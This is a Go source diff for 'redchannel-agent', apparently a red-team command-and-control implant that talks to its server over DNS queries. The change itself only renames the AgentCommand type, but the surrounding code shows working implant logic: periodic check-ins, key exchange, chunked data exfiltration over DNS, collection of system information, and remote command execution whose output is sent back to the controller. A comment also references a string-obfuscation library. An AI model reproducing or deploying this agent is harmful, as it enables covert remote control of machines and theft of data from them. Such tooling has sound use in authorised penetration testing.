@@ -20,7 +20,6 @@ import (
 
 	"github.com/miekg/dns"
 	"github.com/slackr/redchannel-agent/config"
-	"github.com/slackr/redchannel-agent/proto"
 )
 
 /** String obfuscation from https://github.com/unixpickle/gobfuscate
@@ -64,8 +63,8 @@ type Agent struct {
 	id       string
 	password string
 	crypto   Crypto
-	sendq    map[string]proto.AgentCommand                    // map["010FF.chunk"] = 0xff
-	recvq    map[proto.AgentCommand]map[string]map[int][]byte // map[0x01] = ["data_id"] = [0 = chunk1, 1 = chunk2]
+	sendq    map[string]AgentCommand                    // map["010FF.chunk"] = 0xff
+	recvq    map[AgentCommand]map[string]map[int][]byte // map[0x01] = ["data_id"] = [0 = chunk1, 1 = chunk2]
 	sentKey bool
 	config   config.Config
 	shutdown bool
@@ -80,8 +79,8 @@ func (a *Agent) Init() {
 
 	a.crypto = Crypto{}
 
-	a.sendq = make(map[string]proto.AgentCommand)
-	a.recvq = make(map[proto.AgentCommand]map[string]map[int][]byte)
+	a.sendq = make(map[string]AgentCommand)
+	a.recvq = make(map[AgentCommand]map[string]map[int][]byte)
 
 	a.NewAgentID()
 	a.NewKeys()
@@ -109,11 +108,11 @@ func (a *Agent) CheckIn() {
 			log.Printf("no data from proxy c2\n")
 		}
 	}
-	a.QueueData(proto.AgentCommand_AGENT_CHECKIN, []byte{0xff}) //data will be ignored by server
+	a.QueueData(AgentCommand_AGENT_CHECKIN, []byte{0xff}) //data will be ignored by server
 }
 
 // SendEncrypted will encrypt a message byte array and add it to the sendq
-func (a *Agent) SendEncrypted(message []byte, command proto.AgentCommand) {
+func (a *Agent) SendEncrypted(message []byte, command AgentCommand) {
 	if a.crypto.secret == nil {
 		log.Printf("error cannot send encrypted, start keyx first\n")
 		return
@@ -134,13 +133,13 @@ func (a *Agent) Keyx() {
 		a.NewKeys()
 	}
 
-	a.CleanupSendQ(proto.AgentCommand_AGENT_KEYX)
-	a.QueueData(proto.AgentCommand_AGENT_KEYX, a.crypto.pubkey)
+	a.CleanupSendQ(AgentCommand_AGENT_KEYX)
+	a.QueueData(AgentCommand_AGENT_KEYX, a.crypto.pubkey)
 }
 
 // QueueData queues up the data string as DNS queries to be
 // made by ProcessSendQ
-func (a *Agent) QueueData(command proto.AgentCommand, bytes []byte) {
+func (a *Agent) QueueData(command AgentCommand, bytes []byte) {
 	data := BytesToHexString(bytes)
 
 	chunkSplitRegex := fmt.Sprintf("[a-f0-9]{1,%d}", SENDQ_CHUNK_LEN)
@@ -165,12 +164,12 @@ func (a *Agent) QueueData(command proto.AgentCommand, bytes []byte) {
 // Run executes the functions required by the main loop
 func (a *Agent) Run() {
 	a.ProcessSendQ()
-	a.CleanupSendQ(proto.AgentCommand_AGENT_CHECKIN)
+	a.CleanupSendQ(AgentCommand_AGENT_CHECKIN)
 	a.CheckIn()
 }
 
-// CleanupSendQ removes specified proto.AgentCommand queue items
-func (a *Agent) CleanupSendQ(cleanupCommand proto.AgentCommand) {
+// CleanupSendQ removes specified AgentCommand queue items
+func (a *Agent) CleanupSendQ(cleanupCommand AgentCommand) {
 	for item, command := range a.sendq {
 		if command == cleanupCommand {
 			log.Printf("removed from sendq: %q\n", item)
@@ -184,7 +183,7 @@ func (a *Agent) ProcessSendQ() {
 	if a.config.ProxyEnabled == true {
 		var data []string
 
-		var commandsSent []proto.AgentCommand
+		var commandsSent []AgentCommand
 		for item, command := range a.sendq {
 			antiCacheValue := a.crypto.RandomHexString(4)
 			segment := antiCacheValue + "." + item
@@ -301,18 +300,18 @@ func (a *Agent) ProcessResponse(response []string) {
 				return
 			}
 
-			if proto.AgentCommand(command) == proto.AgentCommand_AGENT_IGNORE {
+			if AgentCommand(command) == AgentCommand_AGENT_IGNORE {
 				return
 			}
 
 			dataId = blocks[1]
-			if _, ok := a.recvq[proto.AgentCommand(command)]; !ok {
-				a.recvq[proto.AgentCommand(command)] = map[string]map[int][]byte{}
+			if _, ok := a.recvq[AgentCommand(command)]; !ok {
+				a.recvq[AgentCommand(command)] = map[string]map[int][]byte{}
 			}
-			if _, ok2 := a.recvq[proto.AgentCommand(command)][dataId]; !ok2 {
-				delete(a.recvq, proto.AgentCommand(command)) // delete old command data
-				a.recvq[proto.AgentCommand(command)] = map[string]map[int][]byte{}
-				a.recvq[proto.AgentCommand(command)][dataId] = map[int][]byte{}
+			if _, ok2 := a.recvq[AgentCommand(command)][dataId]; !ok2 {
+				delete(a.recvq, AgentCommand(command)) // delete old command data
+				a.recvq[AgentCommand(command)] = map[string]map[int][]byte{}
+				a.recvq[AgentCommand(command)][dataId] = map[int][]byte{}
 			}
 
 			paddedBytesCount, err = HexBytesToInt(blocks[2][2:4])
@@ -360,17 +359,17 @@ func (a *Agent) ProcessResponse(response []string) {
 			return
 		}
 
-		a.recvq[proto.AgentCommand(command)][dataId][recordNumber] = data
+		a.recvq[AgentCommand(command)][dataId][recordNumber] = data
 
-		receivedRecords := len(a.recvq[proto.AgentCommand(command)][dataId])
+		receivedRecords := len(a.recvq[AgentCommand(command)][dataId])
 		if receivedRecords == totalRecords {
-			a.ProcessRecvQ(proto.AgentCommand(command), dataId, paddedBytesCount)
+			a.ProcessRecvQ(AgentCommand(command), dataId, paddedBytesCount)
 		}
 		//log.Printf("r %d / %d\n", received_records, total_records)
 	}
 }
 
-func (a *Agent) ProcessRecvQ(command proto.AgentCommand, data_id string, padded_bytes_count int) {
+func (a *Agent) ProcessRecvQ(command AgentCommand, data_id string, padded_bytes_count int) {
 	var data []byte
 
 	sortedRecords := make([]int, len(a.recvq[command][data_id]))
@@ -390,7 +389,7 @@ func (a *Agent) ProcessRecvQ(command proto.AgentCommand, data_id string, padded_
 	log.Printf("processed recv: %d: %x\n", command, data)
 	delete(a.recvq, command)
 
-	if command == proto.AgentCommand_AGENT_KEYX {
+	if command == AgentCommand_AGENT_KEYX {
 		err := a.crypto.ComputeSharedSecret(data, a.config.C2Password)
 		if err != nil {
 			log.Printf("failed to compute secret with pubkey: %x (err: %q)\n", data, err)
@@ -407,26 +406,26 @@ func (a *Agent) ProcessRecvQ(command proto.AgentCommand, data_id string, padded_
 	}
 
 	switch command {
-	case proto.AgentCommand_AGENT_SYSINFO:
+	case AgentCommand_AGENT_SYSINFO:
 		var sysinfo = a.GetSysInfo()
 		log.Printf("sysinfo: %s\n", sysinfo)
-		a.SendEncrypted([]byte(sysinfo), proto.AgentCommand_AGENT_SYSINFO)
+		a.SendEncrypted([]byte(sysinfo), AgentCommand_AGENT_SYSINFO)
 		break
-	case proto.AgentCommand_AGENT_EXECUTE:
+	case AgentCommand_AGENT_EXECUTE:
 		cmd := string(decryptedData)
 		args := strings.Fields(cmd)
 		go func() {
 			out, err := exec.Command(args[0], args[1:]...).Output()
 			if err != nil {
 				log.Printf("error executing: %s (err: %s)\n", cmd, err)
-				a.SendEncrypted([]byte(err.Error()), proto.AgentCommand_AGENT_MESSAGE)
+				a.SendEncrypted([]byte(err.Error()), AgentCommand_AGENT_MESSAGE)
 				return
 			}
 			log.Printf("executed command: %s output: %s\n", cmd, out)
-			a.SendEncrypted(out, proto.AgentCommand_AGENT_MESSAGE)
+			a.SendEncrypted(out, AgentCommand_AGENT_MESSAGE)
 		}()
 		break
-	case proto.AgentCommand_AGENT_SET_CONFIG:
+	case AgentCommand_AGENT_SET_CONFIG:
 		cmd := string(decryptedData)
 		setting := strings.Split(cmd, "=")
 		settingName := setting[0]
@@ -436,57 +435,57 @@ func (a *Agent) ProcessRecvQ(command proto.AgentCommand, data_id string, padded_
 		/* cannot set domain and password dynamically
 		// case "d":
 		// 	a.config.C2Domain = setting_value
-		// 	a.SendEncrypted([]byte("config: c2 domain updated"), proto.AgentCommand_AGENT_MESSAGE)
+		// 	a.SendEncrypted([]byte("config: c2 domain updated"), AgentCommand_AGENT_MESSAGE)
 		// 	break
 		// case "p":
 		// 	// c2 must initiate keyx again after changing password
 		// 	a.config.C2Password = setting_value
-		// 	a.SendEncrypted([]byte("config: c2 password updated"), proto.AgentCommand_AGENT_MESSAGE)
+		// 	a.SendEncrypted([]byte("config: c2 password updated"), AgentCommand_AGENT_MESSAGE)
 		// 	break
 		*/
 		case "i":
 			i, err := strconv.Atoi(settingValue)
 			if err != nil {
-				a.SendEncrypted([]byte("error: invalid interval"), proto.AgentCommand_AGENT_MESSAGE)
+				a.SendEncrypted([]byte("error: invalid interval"), AgentCommand_AGENT_MESSAGE)
 				break
 			}
 			a.config.C2Interval = i
-			a.SendEncrypted([]byte("config: c2 interval updated, "+settingValue), proto.AgentCommand_AGENT_MESSAGE)
+			a.SendEncrypted([]byte("config: c2 interval updated, "+settingValue), AgentCommand_AGENT_MESSAGE)
 			break
 
 		case "pk":
 			a.config.ProxyKey = settingValue
-			a.SendEncrypted([]byte("config: proxy_key updated"), proto.AgentCommand_AGENT_MESSAGE)
+			a.SendEncrypted([]byte("config: proxy_key updated"), AgentCommand_AGENT_MESSAGE)
 			break
 		case "pu":
 			a.config.ProxyUrl = settingValue
-			a.SendEncrypted([]byte("config: proxy_url updated"), proto.AgentCommand_AGENT_MESSAGE)
+			a.SendEncrypted([]byte("config: proxy_url updated"), AgentCommand_AGENT_MESSAGE)
 			break
 		case "pe":
 			if settingValue == "true" {
 				if len(a.config.ProxyUrl) == 0 {
-					a.SendEncrypted([]byte("error: no proxy url"), proto.AgentCommand_AGENT_MESSAGE)
+					a.SendEncrypted([]byte("error: no proxy url"), AgentCommand_AGENT_MESSAGE)
 					break
 				}
 				if len(a.config.ProxyKey) == 0 {
-					a.SendEncrypted([]byte("error: no proxy key"), proto.AgentCommand_AGENT_MESSAGE)
+					a.SendEncrypted([]byte("error: no proxy key"), AgentCommand_AGENT_MESSAGE)
 					break
 				}
 				a.config.ProxyEnabled = true
-				a.SendEncrypted([]byte("config: proxy enabled"), proto.AgentCommand_AGENT_MESSAGE)
+				a.SendEncrypted([]byte("config: proxy enabled"), AgentCommand_AGENT_MESSAGE)
 			} else {
 				a.config.ProxyEnabled = false
-				a.SendEncrypted([]byte("config: proxy disabled"), proto.AgentCommand_AGENT_MESSAGE)
+				a.SendEncrypted([]byte("config: proxy disabled"), AgentCommand_AGENT_MESSAGE)
 			}
 			break
 		}
 		break
-	case proto.AgentCommand_AGENT_MESSAGE:
+	case AgentCommand_AGENT_MESSAGE:
 		log.Printf("msg> %s\n", decryptedData)
 		break
-	case proto.AgentCommand_AGENT_SHUTDOWN:
+	case AgentCommand_AGENT_SHUTDOWN:
 		log.Printf("shutting down...\n")
-		a.SendEncrypted([]byte("shutting down..."), proto.AgentCommand_AGENT_MESSAGE)
+		a.SendEncrypted([]byte("shutting down..."), AgentCommand_AGENT_MESSAGE)
 		a.ProcessSendQ()
 		a.shutdown = true
 		break
